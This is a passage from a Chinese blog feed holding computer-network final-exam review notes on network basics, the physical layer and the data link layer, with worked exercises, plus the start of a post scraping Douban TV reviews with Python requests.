<li><p><code>一个自治系统有5个局域网，其连接图如图4-66所示，~~~~</code>(见课本198页4-29题)</p>
<p> 答：<font color="orange">答案见课本430页，十分重要。</font></p>
</li>
<li><p><code>当路由器转发一个IP数据报的时候，可能改变首部中的哪些字段？</code></p>
<p> 答：总长度、标志、片偏移、生存时间、首部检验和、源IP地址、目的IP地址 </p>
</li>
<li><p><code>网络222.15.64.0/20的地址范围是（222.15.64.0）~（222.15.79.255）</code></p>
</li>
<li><p><code>什么是VPN？VPN有什么特点和优缺点？VPN有几种类别？</code></p>
<p>答：虚拟专用网络VPN是指在公用网络上建立专用网络的技术。之所以产我给虚拟网，因为整个网络的任意两个结点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台。</p>
<p>特点：降低成本、传输数据安全可靠、连接方便灵活、完全控制<br>缺点：</p>
<ul>
<li>企业不能直接控制基于互联网的VPN的可靠性和性能</li>
<li>企业创建和部署VPN线路并不容易</li>
<li>不同厂商的VPN产品和解决方案总是不兼容的</li>
<li>当使用无线设备时，VPN有安全风险。</li>
</ul>
<p> <strong><a href="https://www.bilibili.com/read/cv2511049/">推荐一套考研题</a></strong></p>
</li>
</ol>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络（期末复习 1~3章）</title>
    <url>/2020/12/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%EF%BC%88%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0-1-3%E7%AB%A0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章  概述"></a>第一章  概述</h2><p><font color="red">一、计算机网络概念、分类</font></p>
<p>计算机网络是将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接，在网络操作系统，网络管理软件及网络通信协议管理和协调下，实现资源共享和信息传递的计算机系统。</p>
<p>按照网络的作用范围进行分类：</p>
<ol>
<li>广域网WAN：作用范围通常为几十到几千公里</li>
<li>城域网MAN：作用距离约5~公里</li>
<li>局域网LAN：局限在较小的范围</li>
<li>个人局域网PAN：范围很小，大约在10米左右</li>
</ol>
<span id="more"></span>
<p>按照网络的使用者进行分类：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;公用网（按规定缴纳费用）和专用网（免费试用）</p>
<p><font color="red">二、两种通信方式（C/S P2P) </font></p>
<p>C/S: 服务器-客户机，C/S结构通常采取两层结构。服务器负责数据的管理，客户机完成与用户的交互任务。</p>
<p>P2P：对等连接。又称点对点通信，指两台主机在通信时并不区分哪一个是服务请求放哪一个是服务提供方。只要两台主机都运行了对等连接软件，它们就可以进行平等的、对等连接通信。</p>
<p><font color="red"> 三、互联网的组成、分组交换技术的优点和要点 </font></p>
<p>互联网具有两个重要基本特点：连通性和共享性<br>因特网的核心部分由大量网络和路由器组成，为边缘部分提供连通性和交换服务。</p>
<div align="center"><img src="http://www.chenyoude.com/Python%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/150-%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E7%BB%84%E6%88%90-%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84.png?x-oss-process=style/watermark"></div>

<center>分组交换技术</center>

<p>在分组交换网络中，采用存储转发方式工作，数据以短的分组形式传送。如果一个源站有一个长的报文要发送，该报文就会被分割成一系列的分组。每个分组包含用户数据的一部分加上一些控制信息。控制信息至少要包括网络为了把分组送到目的地做路由选择所需要的信息。在路径上的每个结点，分组被接收，短时间存储，然后传递给下一结点。</p>
<p>分组交换奇数的优点：高效，灵活，迅速，可靠。</p>
<p>电路交换 —— 整个报文的比特流连续的从源点直达终点，好像在一个管道中传送</p>
<p>报文交换 —— 整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点</p>
<p>分组交换  —— 单个分组传送到相邻接点，存储下来后查找转发表，转发到下一个结点</p>
<p> <font color="red">四、协议的概念、三要素</font></p>
<p> 网络协议，简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定。</p>
<p> 协议的三个组成要素：</p>
<ol>
<li>语法：数据与控制信息的结构或格式</li>
<li>语义：需要发出何种控制信息，完成何种动作以及做出何种响应</li>
<li>同步：事件实现顺序的详细说明</li>
</ol>
<p><font color="red"> 五、网络的主要性能指标的含义、计算机相关应用（带宽、时延、往返时延、利用率等）</font></p>
<ol>
<li><p>速率<br>速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，也称为数据率或比特率。单位为bit/s 或 kbit/s、Mbits/s、Gbit/s等。</p>
</li>
<li><p>带宽<br>用来表示网络中某通道所传送数据的能力。表示在单位时间内网络中的某信道所能通过的“最高数据率”，单位是bit/s。在时间轴上信号的宽度随带宽的增大而变窄</p>
</li>
<li><p>吞吐量<br>表示单位时间内通过某个网络（或信道、接口）的数据量。吞吐受网络的带宽或网络的额定速率的限制。</p>
</li>
<li><p>时延<br>时延是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。<br>网络中的时延：发送时延、传播时延、处理时延、排队时延</p>
<ul>
<li><p>发送时延</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226172731538.png"></div></li>
<li><p> 传播时延</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226173139459.png"></div>
<br /></li>
<li><p>总时延</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226173251932.png"></div></li>
</ul>
</li>
</ol>
<p>例：</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226174321398.png?"></div>

<p>带宽的变化会引起发送时延的变化；上网时感觉网络时快时慢，主要是（排队时延）引起的；</p>
<ol>
<li><p>时延带宽积<br>链路的时延带宽积又称为以比特为单位的链路长度<br><font color="red" font-weight="bold">时延带宽积 = 传播时延 X 带宽</font></p>
</li>
<li><p>往返时间RTT<br>往返时间表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。</p>
</li>
<li><p>利用率<br>分为信道利用率和网络利用率<br>信道利用率：指出某信道有百分之几的时间是被利用的（有数据通过）<br>网络利用率：全网络的信道利用率的加权平均值</p>
</li>
</ol>
<p>信道利用率并非越高越好。当某信道的利用率增大时，该信道引起的时延也就迅速增加。</p>
<p> <font color="red">六、体系结构的概念、标准，OSI和TCP/IP的层次模型</font></p>
<center>计算机系统结构</center>

<p>计算机网络的体系结构是计算机网络的各层及其协议的集合，体系结构就是这个计算机网络及其部件所应完成的功能的精确定义。</p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226175815870.png"></div>


<center>具有五层协议的体系结构</center>

<div align="center"><img src="https://img-blog.csdnimg.cn/2020122618174112.png"></div>



<center>TCP/IP体系结构的另一种表达方法</center>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201226182144890.png"></div>

<p>例题：<br>1-10、试在下列条件下比较电路交换和分组交换。要传送的报文共x（bit），从源站到目的站共经过k段链路，每段链路的传播时延为d（s），数据率为C（bit/s）。在电路交换时电路的建立时间为s（s）。在分组交换时分组长度为p（bit），且各结点的排队等待时间可忽略不计。问在怎样的条件下，分组交换的时延比电路交换的要小？</p>
<p>解：<div align="center"><img width="500" src="https://img-blog.csdnimg.cn/20201226205431342.png?"></div></p>
<p>1-11、在上题的分组交换网中，设报文长度和分组长度分别为x和（p+h）（bit），其中p为分组的数据部分的长度，而h为每个分组所带的控制信息固定长度，与p的大小无关。通信的两端共经过k段链路。链路的数据率为b（bit/s），但传播时延和结点的排队时间均可忽略不计。若打算使总的时延为最小，问分组的数据部分长度p应取为多大？</p>
<p>解：<div align="center"><img width="400" src="https://img-blog.csdnimg.cn/20201226205602136.png"></div></p>
<h2 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h2><div align="center"><img width="400" src="https://img-blog.csdnimg.cn/202101021538372.png"></div>

<p><font color="red"> 一、 物理层接口的基本特性</font></p>
<p> 机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等（<code>语法</code>）<br> 电气特性：指明在接口电缆的各条线上出现的电压的范围（<code>语义</code>）<br> 功能特性：指明某条线上出现的某一电平的电压表示何种意义<br> 过程特性：指明对于不同功能的各种可能时间的出现顺序（<code>同步</code>）</p>
<p> <font color="red">二、香农公式，信道中的极限信息传输速率和带宽及信噪比的关系</font></p>
<p>码元：承载信息量的基本信号单位</p>
<p>限制码元在信道上的传输速率的因素有：信道能够通过的频率范围、信噪比</p>
<p>在任何信道中，码元传输的速率是有上限的，否则就会出现码间串扰的问题，使接收端对码元的判决成为不可能。如果信道的频带越宽，也就是能够通过的信号高频分量越多，那么就可以用更高的速率传送码元而不出现码间串扰。</p>
<p><font color="#b4d">信噪比就是信号的平均功率和噪声的平均功率之比，常记为S/N，并用分贝（dB）作为度量单位</font></p>
<div align="center"><img src="https://img-blog.csdnimg.cn/20201227101906269.png"></div>


<p><font color="#b4d">香农公式</font></p>
<p>信道的极限信息传输速率C可表达为：</p>
<center><img src="https://img-blog.csdnimg.cn/20201227102157810.png"></center>

<p><font color="red">注：</font><br>    <center><strong>W为信道的带宽（以Hz为单位）；<br>    S为信道内所传信号的平均功率；<br>    N为信道内部的高斯噪声功率；</strong></center></p>
<p>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。实际信道上能够到达的信息传输速率要比香农的极限传输速率低不少。</p>
<p><font color="red"> 三、 物理传输介质的分类（导引、非导引）及导引型传输介质的特性</font></p>
<p>传输媒体可分为两大类：</p>
<ol>
<li>导引型传输媒体：电磁波被导引沿着固体媒体（铜线或光纤）传播；举例：<code>架空明线、双绞线、同轴电缆、光纤</code></li>
<li>非导引型传输媒体：指自由空间。电磁波的传输常被称为无线传输；举例：<code>短波通信、无线电微波通信、卫星通信</code></li>
</ol>
<p>导引型传输介质的特性：</p>
<p><strong>架空明线</strong></p>
<p>是指平行且互相分离或绝缘的架空裸线线路，通常采用铜线或铝线等金属导线</p>
<p><strong>双绞线</strong></p>
<p>两根相互绝缘的铜线并排绞和在一起，减少对相邻导线的电磁干扰。（STP）屏蔽双绞线（UTP）非屏蔽双绞线</p>
<p><strong>同轴电缆</strong></p>
<p>抗电磁干扰性能好，安装复杂，成本低；现在主要用于频带传输，如有线电视</p>
<p><strong>光纤</strong></p>
<p>基本原理是利用光的全反射；传输介质中性能最好、应用前途最广泛的一种；通信容量大、低损耗、宽频带、高数据传输速率、低误码率、安全保密性好、体积小；多模光纤和单模光纤（性能更好）</p>
<p><font color="red"> 四、 通信的三种基本方式（单向通信、双向交换通信、双向同时通信） </font></p>
<p>信道：一般用来表示向某一个方向传送信息的媒体</p>
<ol>
<li><p>单向通信（单工通信）—— 只能有一个方向的通信而没有反方向的交互</p>
</li>
<li><p>双向交替通信（半双工通信）—— 通信的双方都可以发送信息，但不能双方同时发送、接收</p>
</li>
<li><p>双向同时通信（全双工通信）—— 通信的双方可以同时发送和接收信息</p>
</li>
</ol>
<p><font color="red"> 五、信道复用技术的分类及其主要特征（FDM、TDM、 WDM、 CDMS等）</font></p>
<p>复用是通信技术中的基本概念，它允许用户使用一个共享信道进行通信，降低成本，提高利用率。</p>
<p><strong>频分复用（FDM）</strong></p>
<p>频分复用的所有用户在同样的时间占用不同的带宽（频率带宽而不是数据的发送速率）资源</p>
<center><img src="https://img-blog.csdnimg.cn/20201227111557577.png"></center>

<p><strong>时分复用（TDM）</strong></p>
<p>时分复用则是将时间划分为一段段等长的时分复用帧。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙。每一个用户所占用的时隙是周期性地出现。时分复用的所有用户是在不同的时间占用相同的频带宽度。</p>
<center><img src="https://img-blog.csdnimg.cn/20201227112044917.png"></center>

<p>时分复用可能会造成线路资源的浪费。</p>
<p><strong>统计时分复用（STDM）—— 不太重要</strong></p>
<p>STDM不是固定分配时隙，而是按需分配时隙，可提高线路的利用率。</p>
<p><strong>波分复用（WDM）</strong></p>
<p>波分复用就是光的频分复用。使用一根光纤来同时传输多个光载波信号。</p>
<center><img src="https://img-blog.csdnimg.cn/20201227112044917.png"></center>

<p><strong>码分复用（CDM）</strong></p>
<p>常用的名词是码分多址CSMA，个用户使用经过特殊挑选的码型，因此彼此不会造成干扰。</p>
<p>每一个比特时间划分为m个短的间隔，称为码片。</p>
<p>每个站被指派一个唯一的m bit码片序列。</p>
<ul>
<li>如发送比特1，则发送自己的m bit码片序列</li>
<li>如发送比特0，则发送该码片序列的二进制反码</li>
</ul>
<p> <font color="red">六、CDMA的简单应用</font></p>
<p>特点：</p>
<ol>
<li>每个站分配的码片序列不仅必须各不相同，并且还必须互相正交</li>
<li>在实用的系统中是使用伪随机码序列</li>
</ol>
<p><strong>码片序列的正交关系</strong></p>
<p>令向量S表示站S的码片向量，令T表示其他任何站的码片向量。两个不同站的码片序列正交，就是向量S和T的规格化内积等于0.</p>
<center><img src="https://img-blog.csdnimg.cn/20201227120641975.png"></center>

<ul>
<li>任何一个码片向量和该码片向量自己的规格化内积都是1</li>
<li>一个码片向量和该码片反码的向量的规格化内积值时-1</li>
</ul>
<p>CDMA的工作原理</p>
<center><img width="600" src="https://img-blog.csdnimg.cn/20201227121111877.png"></center>

<p>探究问题：</p>
<hr>
<ol>
<li>光纤的带宽很宽，能不能同时传送多路信号？<br>答：能。多模光纤有多路信息通道，同时可以传输多路信号。</li>
<li>自由空间同时有很多电磁波信号在传输，为什么能正常通信？<br>答：<code>没有找到答案，希望看到的人可以解答。谢谢！</code></li>
</ol>
<p>例题：</p>
<hr>
<ol>
<li><p><code>通信系统的一般模型中，（发送器、接收器）是可有可无的</code></p>
</li>
<li><p><code>用香农公式计算一下，假定信道带宽为为3100Hz，最大信道传输速率为35Kb/ｓ，那么若想使最大信道传输速率增加６０％，问信噪比Ｓ/Ｎ应增大到多少倍？如果在刚才计算出的基础上将信噪比Ｓ/Ｎ应增大到多少倍？如果在刚才计算出的基础上将信噪比Ｓ/Ｎ再增大到十倍，问最大信息速率能否再增加２０％？</code></p>
<p> 解：<center><img width="400" src="https://img-blog.csdnimg.cn/20201227124125498.png"></center></p>
</li>
<li><p><code>共有四个站进行码分多址CDMA通信。四个站的码片序列为：A:(-1 -1 -1 +1 +1 -1 +1 +1)        B:(-1 -1 +1 -1 +1 +1 +1 -1)   C:(-1 +1 -1 +1 +1 +1 -1 -1)        D:(-1 +1 -1 -1 -1 -1 +1 -1) 现收到这样的码片序列：(-1 +1 -3 +1 -1 -3 +1 +1)。问哪个站发送数据了？发送数据的站发送的1还是0</code></p>
 <pre>解： A：（+1-1+3+1-1+3+1+1）/ 8 = 1，A发送1；
      B：（+1-1-3-1-1-3+1-1）/ 8  = -1，B发送0；
      C：（+1+1+3+1-1-3-1-1）/ 8 = 0，C没有发送；
      D：（+1+!+3-1+1+3+1-1）/ 8 = 1，D发送1； </pre></li>
</ol>
<h2 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章  数据链路层"></a>第三章  数据链路层</h2><center><img width="400" src="https://img-blog.csdnimg.cn/20201227155409300.png"></center>

<p>数据链路层使用的信道主要有以下两种类型：</p>
<ol>
<li>点对点信道</li>
<li>广播信道</li>
</ol>
<center>数据链路层的简单模型</center>
<center><img width="400" src="https://img-blog.csdnimg.cn/20201227140740307.png"></center>

<p>链路：是一条无源的点到点的物理线路段，中间没有任何其他的交换结点</p>
<p>数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。</p>
<p><font color="red">一、数据链路层的三个基本问题</font></p>
<p>为什么这三个问题都必须加以解决？</p>
<p>答：封装成帧就是在一段数据前后分别添加首部和尾部。接收端以便从收到的比特流中识别帧的开始与结束，帧定界是分组交换的必然要求；透明传输避免消息符号与帧定界符号相混淆；差错检测防止差错的无效数据帧，浪费网络资源。</p>
<ol>
<li><p>封装成帧</p>
</li>
<li><p>透明传输<br>解决透明传输问题：字节填充或字符填充</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227141655880.png"></center></li>
<li><p>差错检测</p>
</li>
</ol>
<p><font color="red">二、点对点协议PPP及其透明传输的实现（同步传输）</font></p>
<p>PPP协议应满足的需求：</p>
<ul>
<li>简单</li>
<li>封装成帧</li>
<li> 透明性</li>
<li>多种网络层协议</li>
<li>多种类型链路</li>
<li> 差错检测</li>
<li>检测连接状态</li>
<li>最大传送单元</li>
<li>网络层地址协商</li>
<li>数据压缩协商</li>
</ul>
<p>PPP协议三个组成部分：</p>
<ol>
<li>一个将IP数据报封装到串行链路的方法</li>
<li>链路控制协议LCP</li>
<li>网络控制协议NCP</li>
</ol>
<p>PPP协议的帧格式：</p>
<p>PPP帧的首部和尾部分别为4个字段和2个字段;PPP是面向字节的，所有的PPP帧的长度都是整数字节</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227154119379.png"></center>

<p>透明传输问题：</p>
<ul>
<li>当PPP用在同步传输链路时，协议规定采用硬件来完成比特填充</li>
<li>当PPP用在异步传输时，就使用一种特殊的字符填充法</li>
</ul>
<p>字符填充：</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227154549921.png"></center>

<p>零比特填充：</p>
<ul>
<li>在发送端，只要发现有5个连续1，则立即添加一个0；</li>
<li>接收端对帧中的比特流进行扫描。每当发现5个连续1时，就把这5个连续1后的一个0删除</li>
</ul>
<p><font color="#b4d">PPP协议已不是纯粹的数据链路层的协议，它还包含了物理层和网络层的内容</font></p>
<p><font color="red">三、差错检测技术（CRC）</font></p>
<table>
<thead>
<tr>
<th>被除数</th>
<th>除数</th>
<th>商</th>
<th>余数</th>
</tr>
</thead>
<tbody><tr>
<td>M（k + 1位）</td>
<td>P（n  + 1位）</td>
<td>Q</td>
<td>R（n位）</td>
</tr>
<tr>
<td>则：M - R = P * Q    模2除法： M + R = P * Q   M * 2^n^ + R^’^ = P * Q^’^</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><font color="#b4d">循环冗余检验的原理</font></p>
<ol>
<li>在发送端，先把数据划分为组。假定每组k个比特，用M表示；</li>
<li>用二进制的模2运算进行 2^n^ 乘M的运算，这相当于在M后面添加几个0；</li>
<li>得到的（k + n）位的数除以实现选定好的长度为（n + 1）位的除数P，得出商是Q，而余数为R，余数R比除数P少1位，即R是n位</li>
<li>将余数R作为冗余码拼接在数据M后面发送出去</li>
</ol>
<p>例题：</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227152524394.png"></center>
<center><img width="500" src="https://img-blog.csdnimg.cn/2020122715285880.png"></center>

<p>接收端对收到的每一帧进行CRC检验</p>
<ul>
<li>若得出的余数R = 0,则判定这个帧没有差错，就接受</li>
<li>若余数R ≠ 0，则判定这个帧由差错，就丢弃。</li>
</ul>
<p><code>仅用循环冗余检验CRC差错检测技术只能做到无差错接收，要做到“可靠传输”就必须再加上确认和重传机制</code></p>
<p><font color="red">四、局域网的拓扑类型、特点等</font></p>
<p>局域网拓扑结构有：星形网、总线网、环形网</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227160929163.png"></center>

<p>适配器（网卡）的作用：</p>
<ul>
<li>进行串行 / 并行转换</li>
<li>对数据进行缓存</li>
<li>在计算机的操作系统安装设备驱动程序</li>
<li>实现以太网协议<center>计算机通过适配器和局域网进行通信</center>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227163805855.png"></center></li>
</ul>
<p>集线器：</p>
<ul>
<li>集线器是使用电子器件来模拟实际电缆线的工作，因此整个系统仍然像一个传统的以太网那样运行</li>
<li>使用集线器的以太网在逻辑上仍是一个总线网，各工作站使用的还是CSMA/CD协议，并共享逻辑上的总线。</li>
<li>集线器很像一个多接口的转发器，工作在物理层</li>
<li>集线器采用了专门的芯片，进行自适应串音回波抵消，减少了近端串音</li>
</ul>
<p><font color="red">五、CSMA/CD协议的工作过程，征用期、最短帧长等概念和应用</font></p>
<p>CSMA/CD含义：载波监听多点接入 / 碰撞检测<br>—<code>载波监听：指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。</code><br>—<code>多点接入：表示许多计算机以多点接入的方式连接在一根总线上</code><br>—<code>碰撞检测：计算机边发送数据边检测信道上的信号电压大小</code></p>
<p><font color="#b4d">CSMA/CD协议工作流程：</font></p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227171313170.png"></center>

<p>信号传播时延对载波监听的影响：</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227170000963.png"></center>

<p>CSMA/CD重要特性：</p>
<ul>
<li>使用CSMA/CD协议的以太网不能进行全双工通信而只能进行双向交替通信</li>
<li>每个站在发送数据后的一段时间内，存在着遭遇碰撞的可能性</li>
<li>这种发送的不确定性使整个以太网的平均通信两远小于以太网的最高数据率</li>
</ul>
<p>征用期：以太网的端到端往返时延2τ称为征用期，或碰撞窗口。经过征用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</p>
<center><font color="liblue">二进制指数类型退避算法</font></center>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227170638250.png"></center>

<p>征用期的长度：</p>
<ul>
<li>10Mbit/s以太网取51.2μs为征用期的长度</li>
<li>对于10Mbit/s以太网，在征用期可发送512bit，即64字节。以太网在发送数据时，若前64字节没有发生冲突，则后续的数据就不会发生冲突）</li>
</ul>
<p>最短有效帧长：以太网规定了最短有效正常为64字节，凡长度小于64字节的帧都是由于冲突而异常终止的无效帧。</p>
<p>例一：<code>假定1km长的CSMA/CD网络的数据率为1Gbit/s。设信号在网络上的传输速率为200000km/s.求能够使用此协议的最短帧长</code></p>
<p>解：比特数（时延带宽积）= 传播时延 * 带宽<br>单程传播时延 = 1 / 200000 = 5μs，来回路程传播时间为10μs，则最小帧的发射时间不能小于10微秒。带宽为 1Gbit/s。<br>则10微秒可发送的比特数：10 * 10^-6^ * 10 ^9^ = 10000，即最短帧是10000位或1250字节长。</p>
<p>例二：<code>在一个采用CSMA/CD协议的网络中，传输介质是一根电缆，传输速率为1Gbps，电缆中的信号传播速度是200000km/s。若最小数据帧长度减少800位，则最远的两个站点之间的距离应至少__减少80m__才能保证网络正常工作。</code></p>
<p>解：设电缆减少的长度为xm，则信号往返减少的路程长度为2xm，因此有 2x/(200000×1000) ≥800/109，得到x≥80。</p>
<center><font color="liblue">10BASE-T以太网在局域网中的统治地位</font></center>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227180018692.png?"></center>

<p>以太网信道被占用的情况：</p>
<p>一个站在发送帧时出现了碰撞。经过一个征用期2τ后，可能又出现了碰撞。这样经过若干个征用期后，一个站发送成功了。假定发送帧需要的时间是T0.</p>
<center><img width="500" src="https://img-blog.csdnimg.cn/20201227182038846.png"></center>

<ul>
<li> 成功发送一个帧需要占用信道的时间是T0 + τ，比这个帧的发送时间要多一个单程端到端时延τ</li>
</ul>
<p>要提高以太网的信道利用率，就必须减少τ与T0之比。在一台网中定义了参数α。它是以太网单程端到端时延τ与帧的发送时间T0之比：</p>
<center><font size="5" color="blue">α = τ / T0</font></center>

<p>对以太网参数α的要求：</p>
<ul>
<li>当数据率一定时，以太网的连线的长度受到限制，否则τ的数值会太大</li>
<li>以太网的帧长不能太短，否则T0的值会太小，使α值太大</li>
</ul>
<p>理想情况下的极限信道利用率Smax为：</p>
<center><img width="300" src="https://img-blog.csdnimg.cn/20201227183801162.png"></center>


<p><font color="red">六、以太网的MAC地址及帧格式中各个字段的作用</font></p>
<p>在局域网中，硬件地址又称为物理地址，或MAC地址。</p>
<center><img width="300" src="https://img-blog.csdnimg.cn/2020122718434040.png"></center>

<p>IEEE的注册管理机构RA负责向厂家分配地址字段6个字节中的前三个字节；地址字段6个字节中的后三个字节有厂家自行指派，必须保证生产出的适配器没有重复地址。</p>
<p>一个地址块可以生出2^24^个不同的地址。生产适配器时，6字节的MAC地址已被固化在适配器的ROM。</p>
<p>“发往本站的帧”包括以下三种帧：</p>
<ul>
<li>单播帧（一对一）</li>
<li>广播帧（一对全体）</li>
<li>多播帧（一对多）</li>
</ul>
<p>只有目的地址才能使用广播地址和多播地址；以混杂方式工作的以太网适配器只要“听到”有帧在以太网上传输就都接收下来。</p>
<p><font color="#b4d">MAC帧的格式</font></p>
<ol>
<li>常用的以太网MAC帧格式有两种标准<br> ① DIX Ethernet V2标准<br> ② IEEE的802.3标准</li>
<li>最常用的MAC帧是以太网V2的格式<center><img width="600" src="https://img-blog.csdnimg.cn/20201227185435225.png"></center></li>
</ol>
<ul>
<li>类型字段：用来标志上一层使用的是什么协议</li>
<li>数据字段的最小长度 = 最小长度64字节 - 18字节的首部和尾部（46字节），当数据字段的长度小于46字节时，应在数据字段的后面加上证书字节的填充字段。</li>
</ul>
<p>无效的MAC帧：</p>
<ul>
<li>数据字段的长度与长度字段的值不一致；</li>
<li>帧的长度不是整数个字节</li>
<li>用收到的帧检验序列FCS查出有差错</li>
<li>数据字段的长度不再46~1500字节之间</li>
<li>有效的MAC帧长度为64~1518字节之间</li>
</ul>
<p>*<code>帧间最小间隔为9.6μs，相当于96bit的发送时间。一个站在检测到总线开始空闲后，还要等待9.6μs才能再次发送数据。这样做是为了使刚刚收到数据帧的站的接收缓存来得及清理，做好接收下一帧的准备。</code></p>
<p><font color="orange">课后探究：</font></p>
<hr>
<ol>
<li><p> PPOE是什么？<br>答：PPPoE的全称是Point to Point Protocol over Ethernet（基于局域网的点对点通讯协议），它通过简单桥接接入设备把一个网络的多个主机连接到远程接入集线器的功能。使用该模型，每一个主机使用自己的PPP协议栈，呈现给用户的还是熟悉的用户接口。</p>
</li>
<li><p>“E”的含义是什么？<br>答：以太网（Ethernet）</p>
<center><img width="700" src="https://img-blog.csdnimg.cn/20201227194127504.png"></center></li>
<li><p>每个接入站点在发送前都先“载波监听”了，为什么发送时还要进行“碰撞检测”？<br>答：<center><img width="500" src="https://img-blog.csdnimg.cn/20201227165524194.png"></center></p>
</li>
<li><p>要连网的计算机太多，一台集线器不够怎么办？<br>答：使用集线器扩展，使用多个集线器可以连成更大的、多级星形结构的以太网。</p>
</li>
</ol>
<p><font color="orange">课后例题：</font></p>
<hr>
<ol>
<li><p><code>假定站点A 和B 在同一个10Mb/s 以太网网段上。这两个站点之间的时延为225 比特时间。现假定A 开始发送一帧， 并且在A 发送结束之前B 也发送一帧。如果A 发送的是以太网所容许的最短的帧，那么A 在检测到和B 发生碰撞之前能否把自己的数据发送完毕？换言之，如果A 在发送完毕之前并没有检测到碰撞，那么能否肯定A 所发送的帧不会和B发送的帧发生碰撞？</code></p>
<p> 解：<a href="https://blog.csdn.net/qq_43068326/article/details/104840944">答案见链接</a></p>
</li>
<li><p><code>当t=255比特时间，A和B同时检测到发生了碰撞，并且在t=255+48=273比特时间完成了干扰信号的传输。A和B在CSMA/CD算法中选择不同的r值退避。假定A和B选择的随机数分别是rA=0和rB=1。试问A和B各在什么时间开始重传其数据帧？A重传的数据帧在什么时间到达B？A重传的数据会不会和B重传的数据再次发生碰撞？B会不会在预定的重传时间停止发送数据？</code></p>
<p> 解：</p>
 <center><img width = 700 src="https://img-blog.csdnimg.cn/20201227210655226.png"></center></li>
</ol>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title> 豆瓣《隐秘的角落》评论爬取 </title>
    <url>/2020/07/08/%E8%B1%86%E7%93%A3%E3%80%8A%E9%9A%90%E7%A7%98%E7%9A%84%E8%A7%92%E8%90%BD%E3%80%8B%E8%AF%84%E8%AE%BA%E7%88%AC%E5%8F%96/</url>
    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a><font color="lighblue">引言</font></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我一直是不追电视剧的，一方面觉得剧集太多了没有那么多的时间去消耗，另一方面就是好的电视剧是真的没有几部（贼讨厌古装）。期末考试那段时间，看到微博、朋友圈刷爆了《隐秘的角落》，觉得那些出圈的梗 “我们一起去爬山”，“我还有机会吗”也不过如此。前几天有点无聊，然后打开视频软件，直接热度第一的就是《隐秘的角落》，本来只打算看个开头。哎呀，真香！我竟然一晚上就看了8集。直至现在，我不仅看完了电视剧，就连B站上面的细节解析、幕后花絮都刷了很多。不得不承认，是真的好看！好看的程度体现在了秦昊成为了我现阶段的男神。那么是什么原因导致这部剧能够大火呢，数据不会说谎！</p>
<h1 id="爬取数据"><a href="#爬取数据" class="headerlink" title="爬取数据"></a><font color="lighblue">爬取数据</font></h1><p>利用 <code>requests + xpath</code>爬取豆瓣评价。</p>
<ol>
<li>获取页面内容</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爬取页面 url</span></span><br><span class="line">douban_url = douban_url = <span class="string">&#x27;https://movie.douban.com/subject/33404425/comments?status=P&#x27;</span></span><br><span class="line"><span class="comment"># requests 发送请求</span></span><br><span class="line">get_response = requests.get(douban_url)</span><br><span class="line"><span class="comment"># 将的到的数据转换成文本</span></span><br><span class="line">get_data = get_response.text</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>分析页面，利用Xpath Helper插件获取用户、评论的内容和评论用户的总数<div align="center"><img width="650" src="https://img-blog.csdnimg.cn/20200707234754854.png"></div>
<div align="center"><img width="650" src="https://img-blog.csdnimg.cn/20200707234836477.png"></div>
<div align="center"><img width="650" src="https://img-blog.csdnimg.cn/20200707234917996.png"></div></li>
</ol>
